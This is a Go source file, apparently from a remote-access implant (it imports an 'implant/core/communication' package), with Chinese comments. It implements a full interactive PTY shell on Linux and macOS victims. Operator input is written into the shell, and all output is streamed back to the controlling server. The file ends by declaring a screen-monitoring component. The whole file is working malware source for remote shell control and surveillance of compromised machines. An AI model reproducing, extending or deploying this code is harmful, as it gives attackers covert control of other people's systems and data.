//go:build linux || darwin

// 交互式 PTY 终端（Linux / macOS 共用）。
//
// 从 commands_linux.go 抽出：creack/pty、os/signal、syscall.SIGWINCH 在两个平台
// 上都可用，差异只有默认 shell 路径（见 commands_pty_{linux,darwin}.go）。
// macOS 此前这三个入口是"暂不支持"的桩，抽出后直接获得完整的交互式终端能力。

package commands

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"implant/core/communication"
	"implant/core/debuglog"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/creack/pty"
)

// ================ 基于github.com/creack/pty的真正交互式终端实现 ================

// TerminalSize 终端窗口大小结构（用于JSON通信）
type TerminalSize struct {
	Rows uint16 `json:"rows"`
	Cols uint16 `json:"cols"`
	X    uint16 `json:"x"`
	Y    uint16 `json:"y"`
}

// XTermPTY 基于github.com/creack/pty的PTY终端管理器
type XTermPTY struct {
	cmd        *exec.Cmd      // shell进程
	ptyFile    *os.File       // PTY文件（github.com/creack/pty库返回）
	isActive   bool           // 终端活跃状态
	mutex      sync.RWMutex   // 读写锁
	size       TerminalSize   // 当前终端大小
	buffer     *bytes.Buffer  // 输出缓冲区
	signalChan chan os.Signal // 信号处理通道
	// cleanupOnce 保证 cleanup 只执行一次（Stop / 信号 / 进程退出三条路径都可能触发）
	cleanupOnce  sync.Once
	closeSigOnce sync.Once
}

// active 线程安全地读取会话活跃状态（isActive 由 cleanup/monitor 在锁内写）
func (pty *XTermPTY) active() bool {
	pty.mutex.RLock()
	defer pty.mutex.RUnlock()
	return pty.isActive
}

var (
	// 全局PTY终端实例
	globalXTermPTY *XTermPTY
	ptyMutex       sync.Mutex
)

// StartInteractiveShell 启动基于github.com/creack/pty的真正PTY交互式终端
func StartInteractiveShell() ([]byte, error) {
	ptyMutex.Lock()
	defer ptyMutex.Unlock()

	if globalXTermPTY != nil && globalXTermPTY.isActive {
		return []byte("[✓] XTerm PTY terminal already running"), nil
	}

	// 创建shell命令，使用兼容性更好的参数支持不同的命令提示符格式
	cmd := exec.Command(interactiveShellPath(), "-i")
	cmd.Env = []string{
		"TERM=xterm-256color",
		"PATH=" + os.Getenv("PATH"),
		"HOME=" + os.Getenv("HOME"),
		"USER=" + os.Getenv("USER"),
		"SHELL=" + interactiveShellPath(),
		"LANG=C.UTF-8",
		"LC_ALL=C.UTF-8",
		// 不设置PS1，使用系统默认的提示符，支持Ubuntu/Kali等不同发行版
	}

	// 使用github.com/creack/pty创建PTY
	ptyFile, err := pty.Start(cmd)
	if err != nil {
		return nil, fmt.Errorf("failed to start PTY with github.com/creack/pty: %v", err)
	}

	// 设置初始终端大小
	ws := &pty.Winsize{
		Rows: 24,
		Cols: 80,
		X:    0,
		Y:    0,
	}
	if err := pty.Setsize(ptyFile, ws); err != nil {
		debuglog.Printf("⚠️ [XTerm PTY] Failed to set initial size: %v\n", err)
	}

	// 创建XTermPTY实例
	ptyTerm := &XTermPTY{
		cmd:        cmd,
		ptyFile:    ptyFile,
		isActive:   true,
		buffer:     &bytes.Buffer{},
		size:       TerminalSize{Rows: 24, Cols: 80, X: 0, Y: 0},
		signalChan: make(chan os.Signal, 1),
	}

	globalXTermPTY = ptyTerm

	// 启动各种处理协程
	go ptyTerm.handlePTYOutput()
	go ptyTerm.monitorProcess()
	go ptyTerm.handleSignals()

	debuglog.Println("🖥️ [XTerm PTY] 基于github.com/creack/pty的真正PTY交互式终端已启动，完全兼容xterm.js")
	return []byte("[✓] XTerm PTY interactive terminal started successfully with github.com/creack/pty"), nil
}

// SendInteractiveInput 发送输入到PTY终端（类似WebSocket消息处理）
func SendInteractiveInput(input []byte) ([]byte, error) {
	ptyMutex.Lock()
	defer ptyMutex.Unlock()

	if globalXTermPTY == nil || !globalXTermPTY.isActive {
		return nil, errors.New("no active xterm PTY terminal session")
	}

	globalXTermPTY.mutex.RLock()
	defer globalXTermPTY.mutex.RUnlock()

	// 检查是否是终端大小调整消息
	if len(input) > 0 && input[0] == '\x01' {
		var size TerminalSize
		if err := json.Unmarshal(input[1:], &size); err == nil {
			return globalXTermPTY.resizeTerminal(size)
		}
	}

	// 特殊按键处理（类似xterm.js的键盘事件）
	processedInput := globalXTermPTY.processSpecialKeys(input)

	// 直接写入PTY文件
	n, err := globalXTermPTY.ptyFile.Write(processedInput)
	if err != nil {
		return nil, fmt.Errorf("failed to write to PTY: %v", err)
	}

	return []byte(fmt.Sprintf("[+] %d bytes sent to PTY terminal", n)), nil
}

// StopInteractiveShell 停止PTY交互式终端
func StopInteractiveShell() ([]byte, error) {
	ptyMutex.Lock()
	defer ptyMutex.Unlock()

	if globalXTermPTY == nil || !globalXTermPTY.isActive {
		return []byte("[!] No active xterm PTY terminal session"), nil
	}

	// 优雅关闭PTY终端
	globalXTermPTY.cleanup()
	globalXTermPTY = nil

	debuglog.Println("🔒 [XTerm PTY] PTY交互式终端已停止")
	return []byte("[✓] XTerm PTY interactive terminal stopped successfully"), nil
}

// handlePTYOutput 处理PTY输出（类似xterm.js的数据处理）
func (pty *XTermPTY) handlePTYOutput() {
	buf := make([]byte, 4096) // 增大缓冲区以支持复杂的ANSI序列
	for pty.active() {
		n, err := pty.ptyFile.Read(buf)
		if err != nil {
			if err != io.EOF && pty.active() {
				debuglog.Printf("❌ [XTerm PTY] 读取PTY输出失败: %v\n", err)
			}
			break
		}
		if n > 0 {
			// 直接发送数据，不使用缓冲区以确保实时性
			data := make([]byte, n)
			copy(data, buf[:n])

			// 只在数据包较大时才输出日志，避免单字符输出的日志滥出
			if n > 10 {
				debuglog.Printf("📤 [XTerm PTY] 发送数据到服务端: %d字节\n", n)
			}

			// 发送原始PTY数据，使用INTERACTIVE_SHELL_INPUT类型(36)
			communication.DataProcess(36, data)
		}
	}
}

// monitorProcess 监控shell进程状态
func (pty *XTermPTY) monitorProcess() {
	err := pty.cmd.Wait()

	pty.mutex.Lock()
	pty.isActive = false
	pty.mutex.Unlock()

	if err != nil {
		debuglog.Printf("⚠️ [XTerm PTY] Shell进程结束: %v\n", err)
		communication.DataProcess(0, []byte("\r\n[!] XTerm PTY terminal session ended\r\n"))
	} else {
		communication.DataProcess(0, []byte("\r\n[✓] XTerm PTY terminal session completed\r\n"))
	}

	// 自动清理资源（cleanup 幂等；Stop/信号路径可能已经清过）
	go func() {
		time.Sleep(1 * time.Second)
		ptyMutex.Lock()
		if globalXTermPTY == pty {
			pty.cleanup()
			globalXTermPTY = nil
		}
		ptyMutex.Unlock()
	}()
}

// handleSignals 处理系统信号
func (pty *XTermPTY) handleSignals() {
	signal.Notify(pty.signalChan, syscall.SIGWINCH, syscall.SIGTERM, syscall.SIGINT)

	for sig := range pty.signalChan {
		if !pty.active() {
			break
		}

		switch sig {
		case syscall.SIGWINCH:
			// 窗口大小变化信号，重新应用当前大小
			pty.applyCurrentSize()
		case syscall.SIGTERM, syscall.SIGINT:
			// 终止信号，优雅关闭
			debuglog.Println("📡 [XTerm PTY] 接收到终止信号，正在关闭...")
			pty.cleanup()
			return
		}
	}
}

// resizeTerminal 调整终端大小（使用github.com/creack/pty）
func (ptyTerm *XTermPTY) resizeTerminal(newSize TerminalSize) ([]byte, error) {
	ptyTerm.size = newSize

	ws := &pty.Winsize{
		Rows: newSize.Rows,
		Cols: newSize.Cols,
		X:    newSize.X,
		Y:    newSize.Y,
	}

	if err := pty.Setsize(ptyTerm.ptyFile, ws); err != nil {
		return nil, fmt.Errorf("failed to resize PTY: %v", err)
	}

	// 发送SIGWINCH信号给shell进程
	if ptyTerm.cmd.Process != nil {
		ptyTerm.cmd.Process.Signal(syscall.SIGWINCH)
	}

	debuglog.Printf("🔧 [XTerm PTY] 终端大小已调整: %dx%d\n", newSize.Cols, newSize.Rows)
	return []byte(fmt.Sprintf("[✓] Terminal resized to %dx%d", newSize.Cols, newSize.Rows)), nil
}

// applyCurrentSize 应用当前终端大小（使用github.com/creack/pty）
func (ptyTerm *XTermPTY) applyCurrentSize() {
	ws := &pty.Winsize{
		Rows: ptyTerm.size.Rows,
		Cols: ptyTerm.size.Cols,
		X:    ptyTerm.size.X,
		Y:    ptyTerm.size.Y,
	}
	pty.Setsize(ptyTerm.ptyFile, ws)
}

// processSpecialKeys 处理特殊按键（类似xterm.js的键盘映射）
func (pty *XTermPTY) processSpecialKeys(input []byte) []byte {
	// 处理常见的特殊键序列
	if len(input) == 1 {
		switch input[0] {
		case 0x7f: // Backspace
			return []byte{0x08} // Convert to BS
			// 0x0d (CR/回车) 直接透传，由 PTY 的 ICRNL 转为换行；不要转成 CRLF，否则 bash 收到两个换行导致提示符重复
		}
	}

	// 处理Arrow键、Function键等复杂序列
	if len(input) >= 3 && input[0] == 0x1b && input[1] == 0x5b {
		// ESC[ 序列（Arrow键等）
		switch input[2] {
		case 0x41: // Up Arrow
			return []byte{0x1b, 0x5b, 0x41}
		case 0x42: // Down Arrow
			return []byte{0x1b, 0x5b, 0x42}
		case 0x43: // Right Arrow
			return []byte{0x1b, 0x5b, 0x43}
		case 0x44: // Left Arrow
			return []byte{0x1b, 0x5b, 0x44}
		}
	}

	return input
}

// cleanup 清理PTY资源（使用github.com/creack/pty）
// cleanup 关闭会话。幂等：StopInteractiveShell / 信号处理 / 进程自然退出后
// monitorProcess 的延迟清理三条路径都会调用它。
//
// 约束：**cmd.Wait() 只能由 monitorProcess 调用一次**。原实现在这里另起
// goroutine 再 Wait 一次，与 monitorProcess 的 Wait 竞争 exec.Cmd 内部状态
// （-race 实测报 data race，且第二次 Wait 返回 "Wait was already called"）。
// 这里只 Kill，让 monitorProcess 的 Wait 正常返回。
func (ptyTerm *XTermPTY) cleanup() {
	ptyTerm.cleanupOnce.Do(func() {
		ptyTerm.mutex.Lock()
		ptyTerm.isActive = false
		ptyTerm.mutex.Unlock()

		// 停止信号处理；通道只关一次（handleSignals 的 range 会随之退出）
		signal.Stop(ptyTerm.signalChan)
		ptyTerm.closeSigOnce.Do(func() { close(ptyTerm.signalChan) })

		// 关闭 PTY 文件：阻塞中的 handlePTYOutput 读取会立即返回错误并退出
		if ptyTerm.ptyFile != nil {
			_ = ptyTerm.ptyFile.Close()
			ptyTerm.ptyFile = nil
		}

		// 终止 shell 进程；Wait 由 monitorProcess 负责
		if ptyTerm.cmd != nil && ptyTerm.cmd.Process != nil {
			_ = ptyTerm.cmd.Process.Kill()
		}
	})
}

// ================ 屏幕监控功能 ================

type LinuxScreenMonitor struct {
	isRunning     bool
	stopChannel   chan bool
	frameRate     int
	mutex         sync.Mutex
	captureMethod string
}

var globalLinuxMonitor = &LinuxScreenMonitor{
	isRunning:     false,
	stopChannel:   make(chan bool, 1),
	frameRate:     5,
	captureMethod: "imagemagick",
}
